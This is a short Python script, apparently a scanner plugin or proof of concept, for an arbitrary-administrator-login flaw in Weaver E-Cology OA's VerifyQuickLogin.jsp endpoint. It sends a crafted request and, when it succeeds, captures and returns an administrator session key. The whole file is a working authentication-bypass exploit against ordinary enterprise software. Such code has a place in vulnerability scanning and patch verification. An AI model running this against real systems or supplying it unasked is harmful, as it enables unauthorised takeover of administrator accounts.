import requests
import re
import urllib, json

def verify(url):
    result = {
        'name': '泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞(2022HVV)',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/mobile/plugin/VerifyQuickLogin.jsp')
    payload_data = 'identifier=1&language=1&ipaddress=x.x.x.x'
    try:
        rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        json_rep = json.loads(rep.text)
        if len(json_rep['sessionkey']) > 0 and json_rep['message'] == "1":
            result['vulnerable'] = True
            result['sessionkey'] = json_rep['sessionkey']
        return result
    except:
        return result
